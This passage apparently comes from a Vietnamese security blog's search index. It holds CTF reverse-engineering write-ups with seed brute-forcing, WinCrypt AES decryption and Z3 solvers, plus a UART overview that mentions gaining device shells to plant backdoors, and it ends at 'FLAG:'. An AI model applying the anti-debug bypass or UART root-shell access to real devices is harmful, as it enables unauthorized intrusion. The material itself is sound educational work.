\"KCSC{\" for i in range(5): randomArray[i] = ord(flag[i]) ^ encodedflag[i] print(randomArray) Sau khi có các giá trị random, mình sẽ đi bruteforce seed. Lưu ý là đề bài cho chúng ta file exe nên ta phải compile source code này trên Windows #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int seedList[] = {191, 245, 39, 4, 67}; int encodedflag[] = {244, 182, 116, 71, 56, 26, 174, 101, 212, 130, 165, 187, 234, 159, 208, 135, 159, 151, 72, 109, 99, 6, 169, 101, 154, 195, 174, 190, 234, 138, 214, 154, 222, 213, 85, 107, 42, 84, 178, 101, 215, 130, 165, 187, 234, 146, 223, 130, 159, 153, 72, 109, 99, 21, 168, 100, 154, 193, 168, 163, 171, 222, 202, 154, 209, 146, 7, 96, 34, 25, 230, 98, 213, 203, 224, 183, 164, 150, 158, 150, 218, 128, 7, 105, 44, 0, 230, 109, 211, 130, 180, 190, 175, 222, 208, 142, 198, 212, 6, 121}; int main() { for (long int s = 0; s \u003c 4294967295; s++) { printf(\"seed = %ld\\n\", s); srand(s); int cnt = 0; for (int i = 0; i \u003c 5; i++) { int tmp = random() \u0026 0xff; if (tmp != seedList[i]) { break; } else { cnt++; } } if (cnt == 5) return 0; } return 0; } // seed = 13973678 Khi đã tìm thấy seed, ta thực hiện xor ngược lại để tìm ra flag. Kết quả thu được là KCSC{nhin em anh boi roi anh thua roi tim em lam loi anh chua tung dam noi anh yeu mot ai the nay!!} #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int seedList[] = {191, 245, 39, 4, 67}; int encodedflag[] = {244, 182, 116, 71, 56, 26, 174, 101, 212, 130, 165, 187, 234, 159, 208, 135, 159, 151, 72, 109, 99, 6, 169, 101, 154, 195, 174, 190, 234, 138, 214, 154, 222, 213, 85, 107, 42, 84, 178, 101, 215, 130, 165, 187, 234, 146, 223, 130, 159, 153, 72, 109, 99, 21, 168, 100, 154, 193, 168, 163, 171, 222, 202, 154, 209, 146, 7, 96, 34, 25, 230, 98, 213, 203, 224, 183, 164, 150, 158, 150, 218, 128, 7, 105, 44, 0, 230, 109, 211, 130, 180, 190, 175, 222, 208, 142, 198, 212, 6, 121}; int randomArray[16]; int main() { srand(13973678); for (int i = 0; i \u003c 16; i++) { randomArray[i] = rand() \u0026 0xff; } randomArray[12] = 0xCA; randomArray[13] = 0xFE; randomArray[14] = 0xBE; randomArray[15] = 0xEF; for (int i = 0; i \u003c sizeof(encodedflag) / sizeof(encodedflag[0]); i++) { printf(\"%c\", encodedflag[i] ^ randomArray[i % 16]); } return 0; } ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:5:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"rev/Shelter Challenge Information 0 solve / 500 pts / by noobmannn Given files: FlagChecker3.exe Description: There is some Crypto in this :3 Hint 1: https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptencrypt Hint 2: Hint 1 → cách mã hoá, phân tích - tìm những thứ cần thiết và hãy để tool làm việc mà nó phải làm Solution Load file đề bài cho vào IDA64. Sau khi phân tích chức năng các hàm, mình đã rename lại và có kết quả như sau int __cdecl main(int argc, const char **argv, const char **envp) { getInput(); paddingInput(); sha256_key(); md5_iv(); encryptData(); checkFlag(); return 0; } Phân tích hàm paddingInput(), nhiệm vụ của hàm này chỉ là padding 0 vào input sao cho độ dài input chia hết cho 16 và không lớn hơn 80 byte. int paddingInput() { int result; // eax unsigned int inputLength; // [esp+Ch] [ebp-14h] unsigned int v2; // [esp+10h] [ebp-10h] unsigned int i; // [esp+14h] [ebp-Ch] inputLength = strlen(input); result = 16 - inputLength % 16; v2 = result; if ( result != 16 ) { for ( i = 0; i \u003c v2; ++i ) { result = i + inputLength; if ( i + inputLength \u003e= 80 ) result = sub_C1756(); input[i + inputLength] = 0; } } return result; } Hàm sha256_key sử dụng các hàm encrypt của WinAPI để tạo hash SHA256 của link https://www.youtube.com/watch?v=fzQ6gRAEoy0 Hàm md5_iv() có chức năng tương tự như hàm sha256_key. Thay vì tạo hash SHA256 thì sẽ tạo hash MD5 cho link https://www.youtube.com/watch?v=fzQ6gRAEoy0 Quan sát hàm encryptData, ta thấy hàm sử dụng thuật toán AES để mã hóa dữ liệu. Các bước thực hiện mã hóa của hàm này diễn ra như sau: Gọi hàm CryptAcquireContextW để set context mã hóa là AES. Gọi hàm CryptImportKey để lấy key sha256Hash. Nó được cất trong pdData ở phía dưới Gọi hàm CryptSetKeyParam để set IV và chế độ mã hóa AES CBC. Gọi hàm CryptEncrypt để mã hóa dữ liệu. Sau khi mã hóa dữ liệu, hàm checkFlag được gọi để so sánh encrypted input với mảng ans đã có sẵn int checkFlag() { unsigned int i; // [esp+0h] [ebp-4h] for ( i = 0; i \u003c inputLength2; ++i ) { if ( *(\u0026copyInput + i) != (unsigned __int8)ans[i] ) { sub_E21040(\"Wrong Flag!!!\\n\"); exit(0); } } return sub_E21040(\"Correct!!! You are awesome \u003c3\\n\"); } Sau khi hiểu rõ toàn bộ luồng hoạt động của chương trình, mình đã viết lại toàn bộ các hàm để tạo ra sha256_hash và md5_iv. Sau đó gọi hàm CryptDecrypt của WinAPI để giải mã. Flag thu được là KCSC{md5_4nd_5h4256_4nd_435_w17h_w1n4p1_YXV0aG9ybm9vYm1hbm5uZnJvbWtjc2M=} #include \u003ccstdio\u003e#include \u003cWindows.h\u003e using namespace std; int main() { DWORD pdwDataLen; HCRYPTPROV phProv; HCRYPTHASH phHash; const char *youtube = \"https://www.youtube.com/watch?v=fzQ6gRAEoy0\"; BYTE byteArray32[32]; BYTE byteArray16[16]; if (CryptAcquireContextW(\u0026phProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { if (CryptCreateHash(phProv, CALG_SHA_256, 0, 0, \u0026phHash)) { if (CryptHashData(phHash, (BYTE*) youtube, strlen(youtube), 0)) { pdwDataLen = 32; CryptGetHashParam(phHash, 2u, (BYTE*) byteArray32, \u0026pdwDataLen, 0); CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); } } } if (CryptAcquireContextW(\u0026phProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { if (CryptCreateHash(phProv, CALG_MD5, 0, 0, \u0026phHash)) { if (CryptHashData(phHash, (BYTE*) youtube, strlen(youtube), 0)) { pdwDataLen = 16; CryptGetHashParam(phHash, 2u, (BYTE*) byteArray16, \u0026pdwDataLen, 0); CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); } } } const unsigned char pbData[44] = { 0x08, 0x02, 0x00, 0x00, 0x10, 0x66, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0xBB, 0x8C, 0x8C, 0x09, 0x51, 0xE8, 0x1C, 0x3C, 0x56, 0x8C, 0x72, 0x81, 0xA3, 0x96, 0x46, 0x3B, 0x0F, 0x0E, 0x05, 0x87, 0xBE, 0xA9, 0x9A, 0x26, 0x7A, 0xF1, 0x59, 0x83, 0x2E, 0x71, 0x7F, 0x06 }; unsigned char ans[] = { 0x5D, 0xDE, 0x8C, 0xAC, 0xAE, 0xE2, 0x2D, 0x9F, 0xF2, 0x49, 0x3F, 0x18, 0x35, 0x09, 0x3C, 0x9E, 0xEF, 0xC5, 0xD1, 0x14, 0xA5, 0x78, 0x02, 0x97, 0x18, 0x5A, 0xE8, 0xA0, 0x8E, 0x4C, 0xDD, 0x19, 0x74, 0x5C, 0xE4, 0x9B, 0x29, 0x95, 0xB8, 0xD7, 0xB9, 0x7D, 0xD0, 0x56, 0xBD, 0x94, 0x99, 0x72, 0xFF","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:6:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"rev/s1mple flag checker but no SEE Challenge Information 2 solves / 496 pts / by 13r_ə_Rɪst Given files: Flag_Checker.java Description: no SEE or no C, you see :)) Solution Đề bài cho chúng ta một file flag checker được viết bởi ngôn ngữ Java import java.util.*; public class Flag_Checker { static int[] pos = { 10, 15, 19, 28, 30, 44, 49 }; static int[] f1nal = { 18, 20, 22, 23, 25, 26, 27, 31, 33, 34, 36, 37, 39, 40 }; public static boolean check1(boolean ret, String s) { if ((!s.substring(0, 5).equals(\"KCSC{\")) || !(s.charAt(s.length() - 1) == '}')) ret = false; return ret; } public static boolean check(boolean ret, String s, int[] arr) { for (int i = 0; i \u003c arr.length; ++i) { if (s.charAt(arr[i]) != 95) return false; } return ret; } public static boolean check(boolean ret, String s, boolean[] arr) { int[] num = new int[10]; for (int i = 0; i \u003c s.length(); ++i) { if (Character.isDigit(s.charAt(i)) != arr[i]) ret = false; } for (int i = 0; i \u003c pos.length; ++i) { num[i] = s.charAt(pos[i]) - 0x30; } if ((num[1] != num[6]) || (num[0] != num[1] - num[6]) || (num[3] + num[4] != num[1]) || (num[6] * num[5] != 20) || (num[0] != num[2]) || (Math.pow(num[3], num[5]) != 256) || ((num[1] ^ num[4]) != 4) || (num[1] != 5)) { ret = false; } return ret; } public static boolean check(boolean ret, String s, char[] arr) { int l = 5, r = 55, cnt = 0; while (cnt \u003c arr.length) { while (!Character.isLetter(s.charAt(l))) l++; while (!Character.isLetter(s.charAt(r))) r--; if (s.charAt(r) != arr[cnt] || s.charAt(l) != arr[cnt + 1]) { ret = false; } cnt += 2; l++; r--; } return ret; } public static boolean check(boolean ret, String s, String tmp) { for (int i = 0; i \u003c f1nal.length; ++i) tmp += s.charAt(f1nal[i]); if (((tmp.charAt(2) ^ tmp.charAt(0)) != 32) || (tmp.charAt(0) + tmp.charAt(5) + tmp.charAt(6) != 294) || (tmp.charAt(1) * tmp.charAt(3) != 8160) || ((tmp.charAt(3) ^ tmp.charAt(4)) != 44) || ((tmp.charAt(2) ^ tmp.charAt(3)) != 9) || (tmp.charAt(0) * tmp.charAt(3) != 8058) || (tmp.charAt(3) - tmp.charAt(4) != 28) || ((tmp.charAt(2) ^ tmp.charAt(7)) != 28) || (tmp.charAt(12) - tmp.charAt(13) + tmp.charAt(9) - tmp.charAt(8) != 38) || (tmp.charAt(3) - tmp.charAt(4) != 28) || ((tmp.charAt(2) ^ tmp.charAt(11)) != 0) || (tmp.charAt(4) - tmp.charAt(6) != -44) || ((tmp.charAt(6) ^ tmp.charAt(8)) != 19) || (tmp.charAt(9) - tmp.charAt(5) != 25) || (tmp.charAt(0) + tmp.charAt(5) + tmp.charAt(7) != 291) || ((tmp.charAt(10) ^ tmp.charAt(5)) != 21) || (tmp.charAt(1) != tmp.charAt(13)) || (tmp.charAt(11) != 111) || (s.charAt(s.length() - 2) != 63)) { ret = false; } return ret; } public static void main(String[] args) { boolean[] isDigit = { false, false, false, false, false, false, false, false, false, false, true, false, false, false, false, true, false, false, false, true, false, false, false, false, false, false, false, false, true, false, true, false, false, false, false, false, false, false, false, false, false, false, false, false, true, false, false, false, false, true, false, false, false, false, false, false, false }; int[] pos = { 17, 21, 24, 29, 32, 35, 38, 47, 52 }; char[] let = { 't', 'P', 'i', 'o', 't', 'L', 'n', 'y', 'i', 'm', 'h', 'r', 'c', 'p', 'o', 'h', 'r', 'i', 'P', 'm' }; Scanner inp = new Scanner(System.in); System.out.print(\"Enter flag: \"); String input = inp.next(); boolean ret = true; if (check(check(check(check(check(ret, input), input, isDigit), input, pos), input, let), input, \"\")) System.out.println(\"Flag is correct\"); else System.out.println(\"Try another one\"); } } Đây là câu lệnh để kiểm tra flag bằng nhiều hàm check lồng nhau: if (check(check(check(check(check(ret, input), input, isDigit), input, pos), input, let), input, \"\")) Ta thấy tên hàm không khác nhau nhưng các đối số được truyền vào khác nhau. Đây là cách viết nạp chồng hàm trong lập trình hướng đối tượng. Để dễ phân biệt, mình sẽ rename các hàm lại tránh việc nhầm lẫn. ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:7:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"Hàm check1 Chỉ đơn giản là đi kiểm tra input có bắt đầu bằng cụm từ KCSC{ và kết thúc bằng } hay không. public static boolean check1(boolean ret, String s) { if ((!s.substring(0, 5).equals(\"KCSC{\")) || !(s.charAt(s.length() - 1) == '}')) ret = false; return ret; } ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:7:1","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"Hàm check2 static int[] pos = { 10, 15, 19, 28, 30, 44, 49 }; boolean[] isDigit = { false, false, false, false, false, false, false, false, false, false, true, false, false, false, false, true, false, false, false, true, false, false, false, false, false, false, false, false, true, false, true, false, false, false, false, false, false, false, false, false, false, false, false, false, true, false, false, false, false, true, false, false, false, false, false, false, false }; public static boolean check2(boolean ret, String s, boolean[] arr) { int[] num = new int[10]; for (int i = 0; i \u003c s.length(); ++i) { if (Character.isDigit(s.charAt(i)) != arr[i]) ret = false; } for (int i = 0; i \u003c pos.length; ++i) { num[i] = s.charAt(pos[i]) - 0x30; } if ((num[1] != num[6]) || (num[0] != num[1] - num[6]) || (num[3] + num[4] != num[1]) || (num[6] * num[5] != 20) || (num[0] != num[2]) || (Math.pow(num[3], num[5]) != 256) || ((num[1] ^ num[4]) != 4) || (num[1] != 5)) { ret = false; } return ret; } Ý tưởng của hàm trên là đi kiểm tra giá trị tại các index trong mảng pos[] có phải là chữ số không. Sau đó convert thành số nguyên, lưu vào mảng num[] rồi đi kiểm tra các điều kiện biểu thức. Mình sẽ dùng Z3 để đi tìm các giá trị của mảng num[] như sau from z3 import * num = [BitVec(f\"num[{i}]\", 8) for i in range(10)] s = Solver() s.add(num[1] == num[6]) s.add(num[0] == (num[1] - num[6])) s.add((num[3] + num[4]) == num[1]) s.add((num[6] * num[5]) == 20) s.add(num[0] == num[2]) # s.add((num[3] ** num[5]) == 256) s.add((num[1] ^ num[4]) == 4) s.add(num[1] == 5) if s.check() == sat: model = s.model() print(model) # [num[4] = 1, num[2] = 0, num[3] = 4, num[5] = 4, num[0] = 0, num[6] = 5, num[1] = 5] Mình có comment lại 1 điều kiện do BitVec không tính mũ được nhưng kết quả tìm ra vẫn thỏa mãn tất cả các điều kiện. Sau bước check này, ta thu được flag có dạng KCSC{*****0****5***0********4*1*************4****5******} ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:7:2","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"Hàm check3 int[] pos = { 17, 21, 24, 29, 32, 35, 38, 47, 52 }; public static boolean check3(boolean ret, String s, int[] arr) { for (int i = 0; i \u003c arr.length; ++i) { if (s.charAt(arr[i]) != 95) return false; } return ret; } Giá trị của các index trong mảng pos[] là _. Ta được flag có dạng KCSC{*****0****5*_*0*_**_***4_1*_**_**_*****4***_5***_**} ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:7:3","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"Hàm check5 static int[] f1nal = { 18, 20, 22, 23, 25, 26, 27, 31, 33, 34, 36, 37, 39, 40 }; public static boolean check5(boolean ret, String s, String tmp) { for (int i = 0; i \u003c f1nal.length; ++i) tmp += s.charAt(f1nal[i]); if (((tmp.charAt(2) ^ tmp.charAt(0)) != 32) || (tmp.charAt(0) + tmp.charAt(5) + tmp.charAt(6) != 294) || (tmp.charAt(1) * tmp.charAt(3) != 8160) || ((tmp.charAt(3) ^ tmp.charAt(4)) != 44) || ((tmp.charAt(2) ^ tmp.charAt(3)) != 9) || (tmp.charAt(0) * tmp.charAt(3) != 8058) || (tmp.charAt(3) - tmp.charAt(4) != 28) || ((tmp.charAt(2) ^ tmp.charAt(7)) != 28) || (tmp.charAt(12) - tmp.charAt(13) + tmp.charAt(9) - tmp.charAt(8) != 38) || (tmp.charAt(3) - tmp.charAt(4) != 28) || ((tmp.charAt(2) ^ tmp.charAt(11)) != 0) || (tmp.charAt(4) - tmp.charAt(6) != -44) || ((tmp.charAt(6) ^ tmp.charAt(8)) != 19) || (tmp.charAt(9) - tmp.charAt(5) != 25) || (tmp.charAt(0) + tmp.charAt(5) + tmp.charAt(7) != 291) || ((tmp.charAt(10) ^ tmp.charAt(5)) != 21) || (tmp.charAt(1) != tmp.charAt(13)) || (tmp.charAt(11) != 111) || (s.charAt(s.length() - 2) != 63)) { ret = false; } return ret; } Hàm này chúng ta tiếp tục sử dụng Z3 để giải. from z3 import * tmp = [BitVec(f\"tmp[{i}]\", 8) for i in range(14)] s = Solver() s.add((tmp[2] ^ tmp[0]) == 32) s.add(tmp[0] + tmp[5] + tmp[6] == 294) s.add(tmp[1] * tmp[3] == 8160) s.add((tmp[3] ^ tmp[4]) == 44) s.add((tmp[2] ^ tmp[3]) == 9) s.add(tmp[0] * tmp[3] == 8058) s.add(tmp[3] - tmp[4] == 28) s.add((tmp[2] ^ tmp[7]) == 28) s.add(tmp[12] - tmp[13] + tmp[9] - tmp[8] == 38) s.add(tmp[3] - tmp[4] == 28) s.add((tmp[2] ^ tmp[11]) == 0) s.add(tmp[4] - tmp[6] == -44) s.add((tmp[6] ^ tmp[8]) == 19) s.add(tmp[9] - tmp[5] == 25) s.add(tmp[0] + tmp[5] + tmp[7] == 291) s.add((tmp[10] ^ tmp[5]) == 21) s.add(tmp[1] == tmp[13]) s.add(tmp[11] == 111) if s.check() == sat: model = s.model() print(model) # [tmp[6] = 118, tmp[8] = 101, tmp[7] = 115, tmp[2] = 111, tmp[10] = 116, tmp[5] = 97, tmp[1] = 80, tmp[4] = 74, tmp[0] = 79, tmp[13] = 80, tmp[11] = 111, tmp[9] = 122, tmp[12] = 97, tmp[3] = 102] Sau khi tìm được giá trị của mảng tmp[], mình tiếp tục lắp ráp nó vào flag theo đúng vị trí trong mảng f1nal[]. tmp = [0] * 14 tmp[6] = 118 tmp[8] = 101 tmp[7] = 115 tmp[2] = 111 tmp[10] = 116 tmp[5] = 97 tmp[1] = 80 tmp[4] = 74 tmp[0] = 79 tmp[13] = 80 tmp[11] = 111 tmp[9] = 122 tmp[12] = 97 tmp[3] = 102 flag = \"KCSC{*****0****5*_*0*_**_***4_1*_**_**_*****4**_*5**_**?}\" flag = [ord(i) for i in flag] idx = [18, 20, 22, 23, 25, 26, 27, 31, 33, 34, 36, 37, 39, 40] for i in range(14): flag[idx[i]] = tmp[i] print(\"\".join([chr(i) for i in flag])) Flag chúng ta thu được là KCSC{*****0****5*_O0P_of_Jav4_1s_ez_to_aP***4**_*5**_**?} ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:7:4","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"Hàm check4 char[] let = { 't', 'P', 'i', 'o', 't', 'L', 'n', 'y', 'i', 'm', 'h', 'r', 'c', 'p', 'o', 'h', 'r', 'i', 'P', 'm' }; public static boolean check4(boolean ret, String s, char[] arr) { int l = 5, r = 55, cnt = 0; while (cnt \u003c arr.length) { while (!Character.isLetter(s.charAt(l))) l++; while (!Character.isLetter(s.charAt(r))) r--; if (s.charAt(r) != arr[cnt] || s.charAt(l) != arr[cnt + 1]) { ret = false; } cnt += 2; l++; r--; } return ret; } Hàm này duyệt một substring sau KCSC{ và trước } trong input với 2 con trỏ left và right. Mỗi con trỏ này sẽ liên tục tăng lên và giảm đi, cuối cùng nó sẽ dừng tại vị trí mà ở đó là một ký tự. Tiếp theo, nó sẽ check input[left] = let[cnt + 1] và input[right] = let[cnt] không và cnt += 2. Lấy ví dụ như flag là KCSC{*****0****5*_O0P_of_Jav4_1s_ez_to_aP***4**_*5**_**?} thì * đầu tiên bên trái phải là let[1] = 'P' và * đầu tiên bên phải phải là let[0] = 't'. Tới đây, chúng ta hoàn toàn có thể làm bằng tay để hoàn thiện flag. Mình có viết một script nhỏ để làm công việc này. Kết quả chạy sẽ bị lỗi out of range nhưng mình không biết tại sao lại bị như vậy. Vì vậy, mỗi lần chạy mình sẽ in ra luôn mảng flag và kết quả cuối cùng thu được là chính xác. flag = \"KCSC{*****0****5*_O0P_of_Jav4_1s_ez_to_aP***4**_*5**_**?}\" flag = [ord(i) for i in flag] charset = ['t', 'P', 'i', 'o', 't', 'L', 'n', 'y', 'i', 'm', 'h', 'r', 'c', 'p', 'o', 'h', 'r', 'i', 'P', 'm'] count = 0 left = 5 right = len(flag) - 2 while (left \u003c= right and count \u003c= len(charset)): while (flag[left] != ord('*')): left += 1 while (flag[right] != ord('*')): right -= 1 flag[left] = ord(charset[count + 1]) flag[right] = ord(charset[count]) count += 2 left += 1 right -= 1 print(flag) # [75, 67, 83, 67, 123, 80, 111, 76, 121, 109, 48, 114, 112, 104, 105, 53, 109, 95, 79, 48, 80, 95, 111, 102, 95, 74, 97, 118, 52, 95, 49, 115, 95, 101, 122, 95, 116, 111, 95, 97, 80, 80, 114, 111, 52, 99, 104, 95, 105, 53, 110, 116, 95, 105, 116, 63, 125] Convert mảng kia thành string và thu được flag là KCSC{PoLym0rphi5m_O0P_of_Jav4_1s_ez_to_aPPro4ch_i5nt_it?} X = [75, 67, 83, 67, 123, 80, 111, 76, 121, 109, 48, 114, 112, 104, 105, 53, 109, 95, 79, 48, 80, 95, 111, 102, 95, 74, 97, 118, 52, 95, 49, 115, 95, 101, 122, 95, 116, 111, 95, 97, 80, 80, 114, 111, 52, 99, 104, 95, 105, 53, 110, 116, 95, 105, 116, 63, 125] print(\"\".join([chr(i) for i in X])) List Challenges rev/Lies Challenge Information 0 solve / 500 pts / by noobmannn Given files: FlagChecker4.exe Description: Don’t miss anything rev/ransom Challenge Information 0 solve / 500 pts Given files: Public.zip Description: Mr.Benj rất thích nghe mumble rap. Một ngày anh ta trong bài hát yêu thích của anh ta có 1 đoạn nghe rất lạ. Hãy giúp anh ta tìm nó. rev/Just not a s1mple flag checker Challenge Information 0 solve /500 pts / by 13r_ə_Rɪst Given files: chall.exe Description: Cảnh này thật quen thuộc, ta đã từng thấy nó ở đâu rồi… ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:7:5","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":" img { box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; border-radius: 6px; display: block; margin: 0 auto 15px; } ","date":"2024-08-24","objectID":"/2025-uart/:0:0","tags":["IOT"],"title":"UART protocol","uri":"/2025-uart/"},{"categories":null,"content":"0x00. Overview Một số thiết bị nhúng có sẵn serial console để phục vụ việc khởi động, giám sát, và gỡ lỗi. Nếu có thể kết nối được với console thông qua UART, chúng ta hoàn toàn có thể truy cập vào shell và thực hiện một số việc như: Cài backdoor trên thiết bị. Dịch ngược firmware để tìm lỗ hổng. ","date":"2024-08-24","objectID":"/2025-uart/:1:0","tags":["IOT"],"title":"UART protocol","uri":"/2025-uart/"},{"categories":null,"content":"0x01 UART protocol UART là viết tắt của Universal Asynchronous Receiver / Transmitter. Dịch nôm na là giao thức truyền nhận bất đồng bộ. UART interface có 4 chân cơ bản, đó là: RX, TX, VCC, GND. Trong đó có 3 chân thường thấy là RX, TX và GND có công dụng như sau: TX: viết tắt của Transmitter là chân truyền dữ liệu RX: viết tắt của Receiver là chân nhận dữ liệu GND: viết tắt của Ground reference hay còn gọi là tham chiếu “đất”, dùng làm điểm để tham chiếu cho giá trị 0V và khử các tín hiệu nhiễu Để xác định được chính xác các chân, ta có thể sử dụng các công cụ như đồng hồ vạn năng hay Logic Anayzer. Tham khảo thêm cách sử dụng các thiết bị trên ở đây: Hacker’s Guide to UART Root Shells Hardware Hacking 101: Getting a root shell via UART Trường hợp 1. Sử dụng đồng hồ vạn năng Nếu có tiếng kêu → Đó là chân GND Nếu điện áp là 0V → Đó là chân RX vì nó đợi dữ liệu Nếu điện áp thay đôi → Đó là chân TX vì nó đang gửi dữ liệu Trường hợp 2. Sử dụng Logic Anayzer Công cụ chúng ta sử dụng để bắt các tín hiệu là Saleae Logic Anayzer. Phần mềm để phân tích các tín hiệu là Logic 2. Để tiến hành phân tích, ta sẽ lần lượt thực hiện các bước sau: Chọn Analyzers Chọn Async Serial Thiết lập các giá trị phù hợp cho Bit Rate, Stop Bits, Parity Bit. Những giá trị còn lại thường sẽ để standard. Lấy ví dụ minh họa là kết quả bài ctf hardware/An4lyz3_1t ở giải ACSC 2024 ","date":"2024-08-24","objectID":"/2025-uart/:2:0","tags":["IOT"],"title":"UART protocol","uri":"/2025-uart/"},{"categories":null,"content":"0x02 UART frame Để truyền dữ liệu đi, dữ liệu sẽ được đóng gói thành các packet. Cấu trúc của packet như trên ảnh: Bit khởi đầu: 1 bit Bit dữ liệu: 5 → 8 bits Bit chẵn lẻ: 1 bit Bit kết thúc: 1 → 2 bits Dưới đây là hình ảnh của frame khi truyền chữ cái A (0x41) ","date":"2024-08-24","objectID":"/2025-uart/:3:0","tags":["IOT"],"title":"UART protocol","uri":"/2025-uart/"},{"categories":null,"content":"0x03 UART transmission Step 1. Transmitting UART nhận dữ liệu song song từ các bus dữ liệu Step 2. Đóng gói packet, thêm các bit như start bit, parity, stop bit Step 3. Truyền dữ liệu Step 4. Receiving UART unpack, lấy dữ liệu trong data frame Step 5. Receiving UART truyền song song các dữ liệu vào các bus dữ liệu ","date":"2024-08-24","objectID":"/2025-uart/:4:0","tags":["IOT"],"title":"UART protocol","uri":"/2025-uart/"},{"categories":null,"content":"0x04 Baud Rates Tốc độ truyền dữ liệu cho biết dữ liệu đã được truyền qua dây nhanh như nào. Đồng thời, tốc độ truyền và nhận dữ liệu phải bằng nhau. Một số tốc độ phổ biến là: 9600 (bps) trên thiết bị cũ 115200 (bps) trên thiết bị hiện đại Công thức tính bps = 1 / bit width ","date":"2024-08-24","objectID":"/2025-uart/:5:0","tags":["IOT"],"title":"UART protocol","uri":"/2025-uart/"},{"categories":null,"content":"Solutions for some challenges in KCSC CTF 2024","date":"2024-05-16","objectID":"/2024-kcscctf/","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"\rimg {\rbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;\rborder-radius: 6px;\rdisplay: block; margin: 15px auto;\r}\r\rSau khi kết thúc thi cuối kỳ môn Pháp Luật Đại Cương, mình được nghỉ hơn 10 ngày để tiếp tục học giai đoạn mới. Đề CTF của KMA hay UIT luôn làm mình hứng thú, đặc biệt là những bài reverse. Thời gian cứ dần trôi, mình lại lặng lẽ lôi vài bài của giải KCSC CTF ra làm để khỏa lấp đi những trống vắng trong trái tim. Trời mùa thu Hà Nội thật đẹp, nó sẽ đẹp hơn rất nhiều nếu như anh có em 🍂 Em nhẹ bước chân qua bao ngọt ngào bao nhiêu cố gắng Có hay không những bước thềm trong con tim em cần một khoảng rộng Biết lúc nào anh có thể lại được gặp em một lần nữa Là khi đó anh cảm nhận mùi hương tàn cánh hoa sữa Anh yêu em thật nồng nàn như một định lí đã muôn thuở Yêu một người có lẽ phải học thêm nhiều điều Em là mảnh ghép cuối cùng anh còn thiếu Nhiều đêm dằn vặt tự gắng mình không hiểu Lắm những yêu thương trôi qua trong em nào thật nhiều Không lí do nào đã khiến em cùng người đó ","date":"2024-05-16","objectID":"/2024-kcscctf/:0:0","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"rev/f@k3 Challenge Information 16 solves / 356 pts Given files: re_fk3.exe ","date":"2024-05-16","objectID":"/2024-kcscctf/:1:0","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x01 Anti Debug \rimg {\rbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;\rborder-radius: 6px;\rdisplay: block; margin-left: auto; margin-right: auto;\r}\r\rFlow chương trình rất ngắn gọn. Mảng Str[] sẽ được decrypt bởi thuật toán RC4 với key = F@**!. Sau đó chương trình so sánh input nhập vào với output là kết quả của giải mã mảng trên. Bật debug lên và check output, ta nhận được một fake flag Mình xref key thì thấy nó còn được xuất hiện trong hàm sub_7FF7423313D0 __int64 sub_7FF7423313D0() { if ( !*(_BYTE *)(qword_7FF742335670 + 2) ) { key[1] |= 1u; key[2] |= 1u; key[3] |= 1u; key[4] |= 1u; } return 0i64; } Vậy khả năng cao đây là hàm anti-debug. Nếu chúng ta debug thì sẽ nhận được key fake, mình đặt breakpoint tại hàm này, sửa lại giá trị cho thanh ghi ZF và thu được key chính xác là FA++! ","date":"2024-05-16","objectID":"/2024-kcscctf/:1:1","tags":["Reverse-Engineering","Pwnable","KCSC CTF","2024"],"title":"KCSC CTF 2024","uri":"/2024-kcscctf/"},{"categories":null,"content":"0x02 Changed function Sau khi có key đúng thì kết quả decrypt vẫn sai. Có một vấn đề là dù input của mình khác nhau nhưng chương trình vẫn luôn in ra Correct!. Tới đây thì mình đoán được luôn hàm lstrcmpA đã bị thay đổi. Nếu các bạn chơi giải KCSC/KMA đủ nhiều sẽ biết kỹ thuật này thường xuyên được sử dụng. Đi sâu vào hàm lstrcmpA, ta thấy flag được tạo ra bằng cách xor output với một mảng Str[] khác và luôn return 0. Đây cũng là lý do tại sao chương trình luôn in ra Correct!. FLAG: 